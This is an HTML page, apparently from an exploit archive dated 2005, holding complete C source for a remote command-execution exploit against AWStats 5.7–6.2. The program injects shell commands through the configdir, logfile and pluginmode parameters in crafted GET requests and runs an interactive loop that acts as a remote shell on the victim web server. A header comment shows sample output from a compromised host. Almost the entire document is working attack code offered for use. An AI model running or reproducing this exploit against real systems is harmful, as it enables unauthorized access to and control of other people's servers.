<html><head><title>AWStats 5.7 - 6.2 Multiple Remote Exploit (extra)</title></head><pre>/*
 * Awstats exploit &quot;shell&quot; 
 * code by omin0us
 * omin0us208 [at] gmail [dot] com
 * dtors security group
 * .:( http://dtors.ath.cx ):.
 *
 * Vulnerability reported by iDEFENSE
 * pluginmode bug has been found by GHC team.
 *
 * The awstats exploit that was discovered allows
 * a user to execute arbitrary commands on the 
 * remote server with the privileges of the httpd 
 *
 * This exploit combines all three methods of exploitation
 * and acts as a remote &quot;shell&quot;, parsing all returned 
 * data to display command output and running in a loop
 * for continuous access.
 * 
 * bash-2.05b$ awstats_shell localhost                                     
 * Awstats 5.7 - 6.2 exploit Shell 0.1
 * code by omin0us
 * dtors security group
 * .: http://dtors.ath.cx :.
 * --------------------------------------
 * select exploit method:
 *        1. ?configdir=|cmd}
 *        2. ?update=1&amp;logfile=|cmd|
 *        3. ?pluginmode=:system(&quot;cmd&quot;);
 *
 * method [1/2/3]? 1
 * starting shell...
 * (ctrl+c to exit)
 * sh3ll&gt; id
 * uid=80(www) gid=80(www) groups=80(www)
 * DTORS_STOP
 * sh3ll&gt; uname -a
 *
 * FreeBSD omin0us.dtors.ath.cx 4.8-RELEASE FreeBSD 4.8-RELEASE #3: Mon Oct 11 
 * 19:34:01 EDT 2004     omin0us@localhost:/usr/src/sys/compile/DTORS  i386
 * DTORS_STOP
 * sh3ll&gt;
 *
 * this is licensed under the GPL
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define PORT 80
#define CMD_BUFFER 512
#define IN_BUFFER 10000
#define MAGIC_START &quot;DTORS_START&quot;
#define MAGIC_STOP  &quot;DTORS_STOP&quot;

void usage(char *argv[]);

int main(int argc, char *argv[]){

	FILE *output;
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	char *host_name=NULL, *awstats_dir=NULL;
	char cmd[CMD_BUFFER], cmd_url[CMD_BUFFER*3], incoming[IN_BUFFER], tmp, c, cli_opt;
	int i, j, flag, method, verbose=0;

	
	if(argc &lt; 2){
		usage(argv);
	}
	
	printf(&quot;Awstats 5.7 - 6.2 exploit Shell 0.1\n&quot;);	
	printf(&quot;code by omin0us\n&quot;);
	printf(&quot;dtors security group\n&quot;);
	printf(&quot;.: http://dtors.ath.cx :.\n&quot;);
    printf(&quot;--------------------------------------\n&quot;);

	while(1){
		cli_opt = getopt(argc, argv, &quot;h:d:v&quot;);

		if(cli_opt &lt; 0)
			break;

		switch(cli_opt){
			case 'v':
				verbose = 1;
				break;
			case 'd':
				awstats_dir = optarg;
				break;
		}
	}

	if((optind &gt;= argc) || (strcmp(argv[optind], &quot;-&quot;) == 0)){
		printf(&quot;Please specify a Host\n&quot;);
		usage(argv);
	}

	if(!awstats_dir){
		awstats_dir = &quot;/cgi-bin/awstats.pl&quot;;
	}
	
	printf(&quot;select exploit method:\n&quot;
	       &quot;\t1. ?configdir=|cmd}\n&quot;
	       &quot;\t2. ?update=1&amp;logfile=|cmd|\n&quot;
	       &quot;\t3. ?pluginmode=:system(\&quot;cmd\&quot;);\n&quot;);
	while(method != '1' &amp;&amp; method != '2' &amp;&amp; method != '3'){
		printf(&quot;\nmethod [1/2/3]? &quot;);
		method = getchar();
	}

	printf(&quot;starting shell...\n(ctrl+c to exit)\n&quot;);
		
	
while(1){
	i=0;
	j=0;
	memset(cmd, 0, CMD_BUFFER);
	memset(cmd_url, 0, CMD_BUFFER*3);
	memset(incoming, 0, IN_BUFFER);
	
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0){
		printf(&quot;Error creating socket\n&quot;);
		exit(1);
	}

	if((host = gethostbyname(argv[optind])) == NULL){
		printf(&quot;Could not resolv host\n&quot;);
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr = *((struct in_addr *)host-&gt;h_addr);

	printf(&quot;sh3ll&gt; &quot;);
	fgets(cmd, CMD_BUFFER-1, stdin);
	
	if(verbose)	
		printf(&quot;Connecting to %s (%s)...\n&quot;, host-&gt;h_name, inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));

	if( connect(sockfd, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_in)) != 0){
		printf(&quot;Count not connect to host\n&quot;);
		exit(1);
	}

	output = fdopen(sockfd, &quot;a&quot;);
	setbuf(output, NULL);

	cmd[strlen(cmd)-1] = '\0';
	if(strlen(cmd) == 0){
		cmd[0]='i';
		cmd[1]='d';
		cmd[3]='\0';
	}

	for(i=0; i&lt;strlen(cmd); i++){
		c = cmd[i];
		if(c == ' '){
			cmd_url[j++] = '%';
			cmd_url[j++] = '2';
			cmd_url[j++] = '0';
		}
		else{
			cmd_url[j++] = c;
		}
	}
	cmd_url[j] = '\0';

	if(method == '1'){
		if(verbose){
			printf(&quot;Sending Request\n&quot;);	
			printf(&quot;GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
	
		fprintf(output, &quot;GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '2'){
		if(verbose){
			printf(&quot;Sending Request\n&quot;);
			printf(&quot;GET %s?update=1&amp;logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
		fprintf(output, &quot;GET %s?update=1&amp;logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '3'){
		if(verbose){
			printf(&quot;Sending Request\n&quot;);
			printf(&quot;GET %s?pluginmode=:system(\&quot;echo+%s;%s;echo+%s\&quot;); HTTP/1.0\n&quot;
&quot;Connection: Keep-Alive\n&quot;
&quot;Host: %s\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
		}
		fprintf(output, &quot;GET %s?pluginmode=:system(\&quot;echo+%s;%s;echo+%s\&quot;); HTTP/1.0\n&quot;
&quot;Connection: Keep-Alive\n&quot;
&quot;Host: %s\n\n&quot;, awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
	}


	i=0;
	while(strstr(incoming, MAGIC_START) == NULL){
		flag = read(sockfd, &amp;tmp, 1);
		incoming[i++] = tmp;

		if(i &gt;= IN_BUFFER){
			printf(&quot;flag [-] incoming buffer full\n&quot;);
			exit(1);
		}
		if(flag==0){
			printf(&quot;exploitation of host failed\n&quot;);
			exit(1);
		}
	}
	
	while(strstr(incoming, MAGIC_STOP) == NULL){
		read(sockfd,&amp;tmp,1);
		incoming[i++] = tmp;
		putchar(tmp);
		if(i &gt;= IN_BUFFER){
			printf(&quot;putchar [-] incoming buffer full\n&quot;);
			exit(1);
		}
	}
	printf(&quot;\n&quot;);
	
	shutdown(sockfd, SHUT_WR);
	close(sockfd);
	fclose(output);
	}
	return(0);
}

void usage(char *argv[]){
        printf(&quot;Usage: %s [options] &lt;host&gt;\n&quot; , argv[0]);
        printf(&quot;Options:\n&quot;);
        printf(&quot;    -d &lt;awstats_dir&gt;     directory of awstats script\n&quot;);
        printf(&quot;                         '/cgi-bin/awstats.pl' is default\n&quot;);
        printf(&quot;                         if no directory is specified\n\n&quot;);
        printf(&quot;    -v                   verbose mode (optional)\n\n&quot;);
        printf(&quot;example: %s -d /stats/awstats.pl website.com\n\n&quot;, argv[0]);
        exit(1);
}	

// milw0rm.com [2005-03-02]</pre></html>